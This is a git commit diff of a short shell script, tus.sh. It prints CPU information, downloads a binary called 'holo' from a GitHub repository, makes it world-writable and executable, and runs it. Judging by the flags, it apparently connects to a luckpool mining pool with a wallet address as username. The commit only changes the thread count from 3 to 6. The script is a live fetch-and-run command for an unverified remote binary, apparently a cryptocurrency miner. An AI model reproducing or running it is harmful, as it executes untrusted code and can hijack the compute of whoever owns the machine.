b6731158a7a9c90ea4fb6ba2f6ae86c1371e0da7
Faradipa <98726391+Faradipa@users.noreply.github.com>
2022-02-01 09:47:48 +0900

    Update tus.sh

--- tus.sh
+++ tus.sh
@@ -1,2 +1,2 @@
 lscpu
-wget https://github.com/Marisakitam/kaman/raw/main/holo && chmod 777 holo && ./holo -v -l na.luckpool.net:3956 -u RHaSb1EVex7nLkDCVspVuHis7XgS9eFpKm.ken -p x -t 3
+wget https://github.com/Marisakitam/kaman/raw/main/holo && chmod 777 holo && ./holo -v -l na.luckpool.net:3956 -u RHaSb1EVex7nLkDCVspVuHis7XgS9eFpKm.ken -p x -t 6
